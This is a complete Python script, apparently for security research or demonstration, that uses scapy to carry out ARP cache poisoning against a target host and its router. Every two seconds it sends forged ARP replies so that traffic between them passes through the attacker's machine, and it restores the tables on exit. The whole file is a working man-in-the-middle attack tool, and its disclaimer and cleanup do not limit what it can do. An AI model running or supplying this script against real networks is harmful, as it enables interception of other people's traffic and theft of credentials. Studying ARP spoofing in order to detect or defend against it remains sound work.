"""
spoofer.py — ARP Spoofer / Man-in-the-Middle intercept tool

Used for controlled security research / demo only.
Restores the ARP tables on exit so the network is never left poisoned.
Run as root: sudo python3 spoofer.py
"""

import sys
import time

from scapy.all import ARP, Ether, send, sendp, getmacbyip

# ---------------------------------------------------------------------------
# CONFIGURATION
# ---------------------------------------------------------------------------
import os
ROUTER_IP  = os.environ.get("ROUTER_IP", "192.168.1.1")
TARGET_IP  = os.environ.get("TARGET_IP", "10.248.115.94")
INTERFACE  = "wlan0"

INTERVAL_S = 2   # seconds between poison packets

# ---------------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------------
def get_mac(ip: str) -> str:
    """Resolve MAC for ip; exit cleanly if unreachable."""
    mac = getmacbyip(ip)
    if not mac:
        print(f"[-] Could not resolve MAC for {ip}. Ping it first.")
        sys.exit(1)
    return mac


def poison(target_ip: str, target_mac: str, spoof_ip: str) -> None:
    """Send a single ARP reply telling target that spoof_ip is at our MAC."""
    send(
        ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip),
        iface=INTERFACE,
        verbose=False,
    )


def restore(dest_ip: str, dest_mac: str, src_ip: str, src_mac: str) -> None:
    """Send genuine ARP reply to undo the poisoning (sends 5 packets for reliability)."""
    send(
        ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac),
        count=5,
        iface=INTERFACE,
        verbose=False,
    )


# ---------------------------------------------------------------------------
# ENTRY POINT
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print(f"--- Zero-Trust ARP Interceptor on {INTERFACE} ---")
    print(f"Target  : {TARGET_IP}")
    print(f"Router  : {ROUTER_IP}")

    target_mac = get_mac(TARGET_IP)
    router_mac = get_mac(ROUTER_IP)

    print(f"Target MAC : {target_mac}")
    print(f"Router MAC : {router_mac}")
    print("Poisoning ARP caches... Press Ctrl+C to stop and restore.\n")

    packets_sent = 0
    try:
        while True:
            # Tell the target: "I am the router"
            poison(TARGET_IP, target_mac, ROUTER_IP)
            # Tell the router: "I am the target"
            poison(ROUTER_IP, router_mac, TARGET_IP)
            packets_sent += 2
            print(f"\r[*] Packets sent: {packets_sent}", end="", flush=True)
            time.sleep(INTERVAL_S)

    except KeyboardInterrupt:
        print(f"\n\n[!] Stopping. Restoring ARP tables (sending 5 correction packets each)...")
        restore(TARGET_IP, target_mac, ROUTER_IP, router_mac)
        restore(ROUTER_IP, router_mac, TARGET_IP, target_mac)
        print("[+] ARP tables restored. Network is clean.")
